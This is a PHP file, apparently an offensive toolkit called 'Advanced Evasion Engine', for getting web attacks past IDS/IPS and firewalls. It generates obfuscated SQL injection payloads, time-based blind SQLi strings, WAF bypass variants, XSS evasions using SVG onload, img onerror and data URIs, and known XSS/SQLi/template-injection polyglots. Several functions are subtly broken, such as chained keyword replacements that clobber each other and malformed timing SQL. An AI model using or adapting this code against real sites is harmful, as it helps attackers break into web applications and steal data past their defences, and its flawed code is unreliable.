<?php
/**
 * Advanced Evasion Engine
 * Sophisticated techniques to bypass IDS/IPS detection
 */

class EvasionEngine {
    
    // Multi-layer encoding to bypass signature detection
    public static function multiLayerEncode($payload) {
        // Layer 1: Base64 encoding
        $encoded = base64_encode($payload);
        
        // Layer 2: URL encoding
        $encoded = rawurlencode($encoded);
        
        // Layer 3: ROT13 for alphabetic characters
        $encoded = str_rot13($encoded);
        
        // Layer 4: Hex encoding for special characters
        $encoded = bin2hex($encoded);
        
        return $encoded;
    }
    
    // Dynamic SQL keyword obfuscation
    public static function obfuscateSQLKeywords($query) {
        $keywords = [
            'SELECT' => ['S','E','L','E','C','T'],
            'UNION' => ['U','N','I','O','N'],
            'WHERE' => ['W','H','E','R','E'],
            'UPDATE' => ['U','P','D','A','T','E'],
            'INSERT' => ['I','N','S','E','R','T'],
            'DELETE' => ['D','E','L','E','T','E'],
            'DROP' => ['D','R','O','P'],
            'CREATE' => ['C','R','E','A','T','E'],
            'ALTER' => ['A','L','T','E','R'],
            'EXTRACTVALUE' => ['E','X','T','R','A','C','T','V','A','L','U','E'],
            'SLEEP' => ['S','L','E','E','P'],
            'LOAD_FILE' => ['L','O','A','D','_','F','I','L','E'],
            'INTO OUTFILE' => ['I','N','T','O',' ','O','U','T','F','I','L','E'],
            'VERSION' => ['V','E','R','S','I','O','N'],
            'CONCAT' => ['C','O','N','C','A','T'],
            'INFORMATION_SCHEMA' => ['I','N','F','O','R','M','A','T','I','O','N','_','S','C','H','E','M','A']
        ];
        
        foreach ($keywords as $keyword => $chars) {
            // Method 1: Character concatenation
            $concat = implode("'||'", array_map('chr', array_map('ord', $chars)));
            $query = str_ireplace($keyword, "CHR(" . implode(")||CHR(", array_map('ord', $chars)) . ")", $query);
            
            // Method 2: Hex representation
            $hex = '0x' . bin2hex($keyword);
            $query = str_ireplace($keyword, $hex, $query);
        }
        
        return $query;
    }
    
    // Character-level SQL injection evasion
    public static function charBasedSQLInjection($injection) {
        // Convert to character codes to bypass keyword detection
        $chars = str_split($injection);
        $charCodes = array_map('ord', $chars);
        
        // Multiple encoding methods
        $methods = [
            'char_func' => 'CHAR(' . implode(',', $charCodes) . ')',
            'ascii_func' => implode('||', array_map(function($code) { return "CHAR($code)"; }, $charCodes)),
            'hex_method' => '0x' . bin2hex($injection),
            'concat_method' => "CONCAT(" . implode(',', array_map(function($char) { return "'$char'"; }, $chars)) . ")"
        ];
        
        return $methods;
    }
    
    // Advanced XSS evasion techniques
    public static function evadeXSSDetection($payload) {
        $evasions = [
            // HTML entity encoding
            'html_entities' => htmlentities($payload, ENT_QUOTES, 'UTF-8'),
            
            // JavaScript string concatenation
            'js_concat' => self::jsConcatenation($payload),
            
            // Unicode evasion
            'unicode' => self::unicodeEvasion($payload),
            
            // CSS expression injection
            'css_expression' => self::cssExpressionEvasion($payload),
            
            // Data URI scheme
            'data_uri' => 'data:text/html;base64,' . base64_encode($payload),
            
            // SVG-based XSS
            'svg_based' => self::svgEvasion($payload),
            
            // Event handler fragmentation
            'event_fragmented' => self::fragmentEventHandlers($payload)
        ];
        
        return $evasions;
    }
    
    private static function jsConcatenation($payload) {
        $chars = str_split($payload);
        $jsChars = array_map(function($char) {
            return 'String.fromCharCode(' . ord($char) . ')';
        }, $chars);
        
        return implode('+', $jsChars);
    }
    
    private static function unicodeEvasion($payload) {
        return preg_replace_callback('/[<>"\'&]/', function($matches) {
            return '\u' . str_pad(dechex(ord($matches[0])), 4, '0', STR_PAD_LEFT);
        }, $payload);
    }
    
    private static function cssExpressionEvasion($payload) {
        return "expression(eval('" . addslashes($payload) . "'))";
    }
    
    private static function svgEvasion($payload) {
        return '<svg onload="' . htmlspecialchars($payload) . '"></svg>';
    }
    
    private static function fragmentEventHandlers($payload) {
        // Break up event handlers across attributes
        return '<img src="x" on' . 'error="' . $payload . '">';
    }
    
    // Protocol-level evasion for HTTP
    public static function httpProtocolEvasion($data) {
        return [
            // HTTP parameter pollution
            'hpp' => self::httpParameterPollution($data),
            
            // Case variation in headers
            'case_variation' => self::headerCaseVariation($data),
            
            // Chunked encoding evasion
            'chunked' => self::chunkedEncoding($data),
            
            // Double URL encoding
            'double_encoding' => rawurlencode(rawurlencode($data))
        ];
    }
    
    private static function httpParameterPollution($data) {
        // Split data across multiple parameters
        $chunks = str_split($data, 5);
        $params = [];
        foreach ($chunks as $i => $chunk) {
            $params["data$i"] = $chunk;
        }
        return $params;
    }
    
    private static function headerCaseVariation($data) {
        // Randomize case in HTTP headers
        return preg_replace_callback('/[a-zA-Z]/', function($matches) {
            return rand(0,1) ? strtoupper($matches[0]) : strtolower($matches[0]);
        }, $data);
    }
    
    private static function chunkedEncoding($data) {
        // Break data into chunks for transfer-encoding evasion
        $chunks = str_split($data, 8);
        $encoded = '';
        foreach ($chunks as $chunk) {
            $encoded .= dechex(strlen($chunk)) . "\r\n" . $chunk . "\r\n";
        }
        $encoded .= "0\r\n\r\n";
        return $encoded;
    }
    
    // Advanced timing-based evasion
    public static function timingBasedEvasion($payload) {
        // Use different timing functions to avoid SLEEP detection
        $timingFunctions = [
            'benchmark' => "BENCHMARK(5000000, SHA1('a'))",
            'heavy_query' => "(SELECT COUNT(*) FROM information_schema.columns)",
            'regex_delay' => "(SELECT * FROM (SELECT(SLEEP(5)))a)",
            'mathematical' => "(SELECT * FROM (SELECT(POW(99999,99999)))a)",
        ];
        
        foreach ($timingFunctions as $name => $func) {
            $payload = str_ireplace('SLEEP(', $func . ' AND (1=1) AND (SELECT 1 FROM (SELECT(', $payload);
        }
        
        return $payload;
    }
    
    // Dynamic query construction to avoid static analysis
    public static function dynamicQueryConstruction($baseQuery, $injection) {
        // Break query into parts stored in different variables
        $parts = [
            'select' => base64_decode('U0VMRUNU'), // SELECT
            'from' => base64_decode('RlJPTQ=='),   // FROM  
            'where' => base64_decode('V0hFUkU='),  // WHERE
            'union' => base64_decode('VU5JT04='),  // UNION
            'and' => base64_decode('QU5E'),        // AND
            'or' => base64_decode('T1I='),         // OR
        ];
        
        // Construct query dynamically
        $dynamicQuery = str_replace(array_keys($parts), array_values($parts), $baseQuery);
        
        // Add injection with obfuscation
        $obfuscatedInjection = self::multiLayerEncode($injection);
        
        return $dynamicQuery . ' ' . $obfuscatedInjection;
    }
    
    // WAF bypass techniques
    public static function wafBypass($payload) {
        $techniques = [
            // Comment injection
            'comments' => self::injectComments($payload),
            
            // Whitespace manipulation
            'whitespace' => self::manipulateWhitespace($payload),
            
            // Alternative operators
            'operators' => self::alternativeOperators($payload),
            
            // Encoding variations
            'mixed_encoding' => self::mixedEncoding($payload)
        ];
        
        return $techniques;
    }
    
    private static function injectComments($payload) {
        // Inject SQL comments to break signatures
        $payload = str_replace(' ', '/**/', $payload);
        $payload = str_replace('=', '/**/=/**/', $payload);
        return $payload;
    }
    
    private static function manipulateWhitespace($payload) {
        // Use different whitespace characters
        $whitespace = ['\t', '\n', '\r', '\f', '\v', '/**/'];
        return str_replace(' ', $whitespace[array_rand($whitespace)], $payload);
    }
    
    private static function alternativeOperators($payload) {
        $replacements = [
            'AND' => '&&',
            'OR' => '||',
            '=' => 'LIKE',
            '1=1' => '1 LIKE 1',
            'UNION' => 'UNION ALL',
            '--' => '#'
        ];
        
        return str_ireplace(array_keys($replacements), array_values($replacements), $payload);
    }
    
    private static function mixedEncoding($payload) {
        $result = '';
        for ($i = 0; $i < strlen($payload); $i++) {
            $char = $payload[$i];
            switch (rand(0, 3)) {
                case 0:
                    $result .= $char; // No encoding
                    break;
                case 1:
                    $result .= '&#' . ord($char) . ';'; // Decimal encoding
                    break;
                case 2:
                    $result .= '&#x' . dechex(ord($char)) . ';'; // Hex encoding
                    break;
                case 3:
                    $result .= rawurlencode($char); // URL encoding
                    break;
            }
        }
        return $result;
    }
}

// Steganographic payload hiding
class SteganographicEvasion {
    
    public static function hideInImage($payload) {
        // Hide payload in image metadata or LSB
        return base64_encode($payload) . '.jpg';
    }
    
    public static function hideInCSS($payload) {
        // Hide JavaScript in CSS comments or properties
        return "/* " . base64_encode($payload) . " */";
    }
    
    public static function hideInJSON($payload) {
        // Hide payload in JSON structure
        return json_encode(['data' => base64_encode($payload), 'type' => 'hidden']);
    }
}

// Anti-debugging and detection techniques
class AntiDetection {
    
    public static function addJunk($payload) {
        // Add junk data to confuse analysis
        $junk = str_repeat('/*junk*/', rand(5, 15));
        return $junk . $payload . $junk;
    }
    
        public static function polyglotGeneration($contexts) {
        // Generate payloads that work in multiple contexts
        $polyglots = [
            'html_js' => 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=' . "'" . '/"/+/onmouseover=1/+/[*/[]/+alert(1);//>',
            'sql_xss' => '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"\'>alert(String.fromCharCode(88,83,83))</SCRIPT>',
            'multi_lang' => '${@print(md5(hello))}${@print(md5("hello"))}#{print(md5("hello"))}'
        ];
        
        return $polyglots;
    }
}
?>
